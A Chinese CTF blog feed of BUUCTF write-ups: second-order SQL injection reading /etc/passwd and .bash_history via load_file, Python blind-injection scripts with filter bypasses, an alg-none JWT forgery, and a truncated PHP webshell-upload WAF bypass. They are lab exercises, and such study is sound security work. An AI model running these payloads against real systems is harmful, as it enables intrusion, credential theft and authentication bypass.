&#x27;write&#x27;:</span><br><span class="line">    break;</span><br><span class="line">case &#x27;comment&#x27;:</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>但是发现源码不全 </p><p>用<code>git log</code>或者 <code>git log --reflog</code>找到原来的代码然后恢复</p><p>但是我这里没有复现成功 一直报错 找了好久没发现是什么原因</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457000040-68cd4018-9ec3-40a8-b762-b9cc760e35b5.png" alt="img"></p><p>无果只能再去寻找别的方法</p><p>然后发现了另一个 提取远程 git 泄露或本地 git 的工具   git_extract  可以说是增强版 </p><p>源码地址：<a href="https://github.com/gakki429/Git_Extract">https://github.com/gakki429/Git_Extract</a></p><p>调用的时候 要用python2 因为这是python2的脚本</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457176398-212a1e06-efb1-4962-a7ca-4eeb2f93d696.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457212657-afd10c8f-9d96-48ce-8e53-9ce1e4516f90.png" alt="img"></p><p>发现了更早的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;</span><br><span class="line">    header(&quot;Location: ./login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;do&#x27;]))&#123;</span><br><span class="line">switch ($_GET[&#x27;do&#x27;])</span><br><span class="line">&#123;</span><br><span class="line">case &#x27;write&#x27;:</span><br><span class="line">    $category = addslashes($_POST[&#x27;category&#x27;]);</span><br><span class="line">    $title = addslashes($_POST[&#x27;title&#x27;]);</span><br><span class="line">    $content = addslashes($_POST[&#x27;content&#x27;]);</span><br><span class="line">    $sql = &quot;insert into board</span><br><span class="line">            set category = &#x27;$category&#x27;,</span><br><span class="line">                title = &#x27;$title&#x27;,</span><br><span class="line">                content = &#x27;$content&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">    break;</span><br><span class="line">case &#x27;comment&#x27;:</span><br><span class="line">    $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);</span><br><span class="line">    $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    if($num&gt;0)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[&#x27;category&#x27;];</span><br><span class="line">    $content = addslashes($_POST[&#x27;content&#x27;]);</span><br><span class="line">    $sql = &quot;insert into comment</span><br><span class="line">            set category = &#x27;$category&#x27;,</span><br><span class="line">                content = &#x27;$content&#x27;,</span><br><span class="line">                bo_id = &#x27;$bo_id&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: ./comment.php?id=$bo_id&quot;);</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析：</p><p>存在两个表 board 和 commet</p><p>并且  <code>$sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;</code>当我们评论时候还会调用board表</p><p>再来看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;insert into comment</span><br><span class="line">           set category = &#x27;$category&#x27;,</span><br><span class="line">               content = &#x27;$content&#x27;,</span><br><span class="line">               bo_id = &#x27;$bo_id&#x27;&quot;;</span><br></pre></td></tr></table></figure><p> $category,$content是我们可控的。且最后显示的是content，我们可以尝试闭合content &#x3D; ‘$content’</p><p>举例当我们去发帖语句为</p><p> category 为<code>&#39;,content=user(),/*</code>其它随意，然后去详情里面评论<code>*/#</code> 这样就会回显我们当前用户信息 </p><p> 然后语句会被拼接成下面这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">insert into comment</span><br><span class="line">       set category = &#x27; &#x27;,content=user()，/*&#x27;,</span><br><span class="line">           content = &#x27;*/#&#x27;,</span><br><span class="line">           bo_id = &#x27;$bo_id&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>即原来的content内容被我们用注释<code>/**/</code>给注释了 我们自己可以创建一个content从而达到我们想要的语句</p><p>构造payload:<code>&#39;,content=user(),/*</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457876263-11247f01-8e8e-4d7d-bc18-9f12b9db735c.png" alt="img"></p><p>发现是root权限 这可太行了</p><p>直接用load_file()函数去读文件</p><p>构造payload:<code>123&#39;,content=((select(load_file(&quot;/etc/passwd&quot;)))),/*</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">category=123&#x27;,content=((select(load_file(&quot;/etc/passwd&quot;)))),/*` 注意一下这里category里面最好随便放点内容 如果直接是空的 比如构造成这样`&#x27;,content=((select(load_file(&quot;/etc/passwd&quot;)))),/*</span><br></pre></td></tr></table></figure><p>闭合进去之后就会变成<code>category=&#39;&#39;</code>直接为空字符 可能会无回显</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681458181723-73e833f2-d821-432c-9068-e596e2fdc3f6.png" alt="img"></p><p>发现成功读取</p><p>看到最后一行 发现存在www用户 那么这是什么呢 一般我们在linux下安装web开设靶场 一般默认系统web用户会为www</p><p>一般增加的用户信息会在&#x2F;home路径下 root本身的信息会在根目录&#x2F;root路径里</p><p>比如我曾经在我的centos7上装过小皮面板 就会有个www用户默认在我的&#x2F;home路径下（那个apple用户是我当时创建的用户 ）</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681459107727-6f72a691-4d4d-4bfb-978b-ec74ff3871b8.png" alt="img"></p><p>并且能看到地址目录为：&#x2F;home&#x2F;www</p><p>构造payload:<code>123&#39;,content=((select(load_file(&quot;/home/www/.bash_history&quot;)))),/*</code></p><p>这里.bash_history文件是什么呢 一般在linux 以<code>.</code>开头的都是隐藏文件</p><p><strong>在终端敲过的命令，linux是有记录的，默认可以记录500条历史命令。这些命令保存在用户的宿主目录中的.bash_history文件中。</strong></p><p>拿我本地apple用户来说，如下</p><p>我曾经修改过apple用户的密码 所以有记录</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681475557865-59d282b4-768a-4e0d-b4d2-4723531214e1.png" alt="img"></p><p>回到题目得到</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681475942695-14971e8c-c568-4952-af18-e563d06b2d01.png" alt="img"></p><p>看到记录有依次如下操作：</p><ol><li><code>cd /tmp</code></li><li><code>unzip html.zip</code></li><li><code>rm -f html.zip</code></li><li><code>cp -r html /var/www/</code></li><li><code>cd /var/www/html/</code></li><li><code>rm -f .DS_Store</code></li><li><code>service apache2</code></li></ol><p>他只删除了在&#x2F;var&#x2F;www&#x2F;html下的 .DS_Store文件 原来路径下的.DS_Store文件还保存着 我们可以读取，并且里面内容读出来大多数是乱码 最好以hex()函数也就是16进制读出来</p><p> .DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。  </p><p>构造payload：<code>test&#39;,content=((select(hex(load_file(&quot;/tmp/html/.DS_Store&quot;))))),/*</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681476511756-e8b75674-d60e-4d5d-a7ce-31cf1e5ab0bf.png" alt="img"></p><p>发现了flag文件名  flag_8946e1ff1ee3e40f.php</p><p>然后去读取 构造payload：<code>test&#39;,content=((select(hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))))),/*</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681477444236-e9e3cfb8-9317-4232-8d52-18308f23d7fd.png" alt="img"></p><p>转码得到flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681477495066-73d43d91-f33b-43a7-b0cf-182e906dd900.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 源码泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-86-[GYCTF2020]Ezsqli</title>
      <link href="/post/d359692.html"/>
      <url>/post/d359692.html</url>
      
        <content type="html"><![CDATA[<p>[GYCTF2020]Ezsqli</p><span id="more"></span><p>一眼丁真，鉴定为sql盲注。</p><h2 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">#调requests模块</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/&#x27;</span>  </span><br><span class="line"><span class="comment">#payload = &#123;&quot;id&quot;:&quot;0^(ascii(substr((select database()),1,1))&gt;97)&quot;&#125;</span></span><br><span class="line">database = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;0^(ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,j)&#125;</span><br><span class="line">        r = requests.post(url,data=payload)</span><br><span class="line">        time.sleep(<span class="number">0.005</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            database+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(database)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 爆库 give_grandpa_pa_pa_pa</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680942404461-ef13c20a-2bb9-45ae-8ff3-c0427fb9144b.png" alt="img"></p><p>库没用其实，之后可以用database()代替 而且and也是被河蟹了 give_grandpa_pa_pa_pa  库名用不了的</p><h2 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h2><p>因为or被河蟹</p><p>所以不能用<code>information_schema</code>来查询 用<code>sys.x$schema_flattened_keys</code>来代替</p><p>参考：<a href="https://nosec.org/home/detail/3830.html">https://nosec.org/home/detail/3830.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">#调requests模块</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/&#x27;</span>  </span><br><span class="line"><span class="comment">#payload = &#123;&quot;id&quot;:&quot;0^ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))&lt;103&quot;&#125;</span></span><br><span class="line">tables = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">12</span>):</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;0^(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1))=&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,j)&#125;</span><br><span class="line">        r = requests.post(url,data=payload)</span><br><span class="line">        time.sleep(<span class="number">0.005</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            tables+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(tables)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680945616193-69eecadc-cb2f-454e-b445-ddf0fae6ee7d.png" alt="img"></p><p>使用二分法改进后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">#调requests模块</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/&#x27;</span>  </span><br><span class="line">tables = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    low=<span class="number">31</span></span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=high:</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;0^(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid)&#125;</span><br><span class="line">        r = requests.post(url,data=payload)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid-<span class="number">1</span></span><br><span class="line">            mid = (low+high)//<span class="number">2</span></span><br><span class="line">    tables+=<span class="built_in">chr</span>(high+<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(tables)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure><h2 id="爆flag"><a href="#爆flag" class="headerlink" title="爆flag"></a>爆flag</h2><p>这里用到了列比较去试flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682765495231-e76b1bfa-890e-434c-ac6e-8b375375bddf.png" alt="image.png"></p><p><code>0^((1,&#39;&#123;0&#125;&#39;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</code> 这里的 1是猜测第一列一般为索引id 1，因此在这里用1，之后就是去慢慢写脚本去试字符，这里写脚本的时候要加上之前已经爆出的字符慢慢去比较。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">#调requests模块</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/&#x27;</span>  </span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    low=<span class="number">31</span></span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=high:</span><br><span class="line">        flag_1 = flag + <span class="built_in">chr</span>(mid)</span><br><span class="line">        payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;0^((1,&#x27;&#123;0&#125;&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&quot;</span>.<span class="built_in">format</span>(flag_1)&#125;</span><br><span class="line">        r = requests.post(url,data=payload)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            high=mid-<span class="number">1</span></span><br><span class="line">            mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high)//<span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(flag,<span class="built_in">chr</span>(high))</span><br><span class="line">    flag+=<span class="built_in">chr</span>(high)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680960278657-402336f5-111f-495a-982c-872e948175e1.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> sql bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-85-[HFCTF2020]EasyLogin</title>
      <link href="/post/a8c0011c.html"/>
      <url>/post/a8c0011c.html</url>
      
        <content type="html"><![CDATA[<p>[HFCTF2020]EasyLogin</p><span id="more"></span><p>一道关于jwt认证的题目 之前有做过相同的题目</p><p>申请一个账号登录  然后就是一个获取flag的输入框 但是我们普通身份肯定是获取不到的</p><p>这里我试了试申请admin账号发现不行 做到这里估计是后面大概率是要伪造身份为admin然后getflag</p><p>查看源码发现是用koa框架</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961292803-2507d542-7b9c-4425-9228-4b0c8129a613.png" alt="img"></p><p>然后看了一下别人的wp这个框架是用jwt鉴权的</p><p>关于鉴权可以看这篇文章<a href="https://juejin.cn/post/7003147063542153224">https://juejin.cn/post/7003147063542153224</a></p><p>登录抓包</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961802245-b79f5a21-698c-4857-8b2c-d169a365a871.png" alt="img"></p><p>将其放入<a href="https://jwt.io/">https://jwt.io/</a> 自动帮我们生成相关信息</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961865878-e174b300-c12c-44a4-bd80-b9f0908ae748.png" alt="img"></p><p>JWT(json web token)的三个部分依次如下：（参考：<a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html%EF%BC%89">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html）</a></p><ul><li>Header（头部）</li><li>Payload（负载）</li><li>Signature（签名）</li></ul><p>比如：<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY4MTk1OTg3N30.jJv8tD-ULxBStlglQIsVQgnR-nC7hbxsPJqOQiF_qJg</code></p><p>三部分之间用<code>.</code>间隔</p><p>这里这里绕过需要将alg（算法）改为none 将secretid改为[]</p><p>因为这个网站无法成none后的jwt编码 所以只能手动生成 也就是每部分base64编码 然后再用<code>.</code>连接</p><p>因为算法已经是none了所以不需要第三段签名了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;: &quot;none&quot;,&quot;typ&quot;: &quot;JWT&quot;&#125;</span><br><span class="line">eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ==</span><br><span class="line">&#123;&quot;secretid&quot;: [],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123&quot;,&quot;iat&quot;: 1681959877&#125;</span><br><span class="line">eyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9</span><br></pre></td></tr></table></figure><p><code>eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9.</code>注意这里虽然签名部分被省略了 但是最后一个<code>.</code>要加上 并且签名中base64编码中用来补位<code>==</code>要删除</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962341963-9db7cc75-363b-4962-a3e9-305804f318ad.png" alt="img"></p><p>成功以admin身份登入</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962377789-ed8fda04-f829-4128-b346-0eaa7fd13958.png" alt="img"></p><p>获取flag即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962413236-6f1c0fae-a99c-4e2c-bb3b-b1eddb193dfd.png" alt="img"></p><p>其实这道题还是前期信息检索去明白他框架是jwt鉴权</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-79-[红明谷CTF 2021]write_shell</title>
      <link href="/post/51b0b22f.html"/>
      <url>/post/51b0b22f.html</url>
      
        <content type="html"><![CDATA[<p>[红明谷CTF 2021]write_shell</p><span id="more"></span><h2 id="碎碎念："><a href="#碎碎念：" class="headerlink" title="碎碎念："></a>碎碎念：</h2><p>这道题目还是蛮简单的，考了php短标签和空格绕过，还有一个双问号表达式</p><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>放出源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function check($input)&#123;</span><br><span class="line">    if(preg_match(&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;</span><br><span class="line">        // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br><span class="line">        die(&#x27;hacker!!!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function waf($input)&#123;</span><br><span class="line">  if(is_array($input))&#123;</span><br><span class="line">      foreach($input as $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;</span><br><span class="line">if(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;</span><br><span class="line">    case &#x27;pwd&#x27;:</span><br><span class="line">        echo $dir;</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;upload&#x27;:</span><br><span class="line">        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先就是通过你的<code>sandbox+md5(ip)</code>创建一个沙盒路径 老套路了</p><p>然后这里有两个问号<code>??</code>先来看看</p><p>这种是比较运算符中的NULL 合并操作符,从PHP7开始提供,作用是:从左往右第一个存在且不为 NULL 的操作数。如果都没有定义且不为 NULL，则返回 NULL  </p><p>就是如果c&#x3D; a??b 如果a为0 则c&#x3D;b 如果a不为0 则c&#x3D;a</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661478990-0980b9d2-889c-49ef-a790-becc223c2860.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661494898-f5c96b64-3163-4984-9ebb-6d5cfd802007.png" alt="img"></p><p>然后就是有两个模式 一个pwd就是返回路径的 upload模式让我提交shell的但是提交前会通过一个筛选</p><p>过滤了<code>&quot;/&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</code> <code>php eval &#123;&#125; </code> 空格都被禁了</p><p>如果直接构造<code>?data=ls%09/</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661798378-610250da-1970-4ea0-92aa-8712ea9df795.png" alt="img"></p><p>则只会显示 不会执行 那么我们需要构造php代码去执行我们的linux命令 这也印证了前面为什么要禁php字样了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661956409-64ad7724-461e-4519-adb7-e66b1a2ea3e7.png" alt="img"></p><p>但是php字样被禁 所以要用短标签了 下面二选一</p><figure 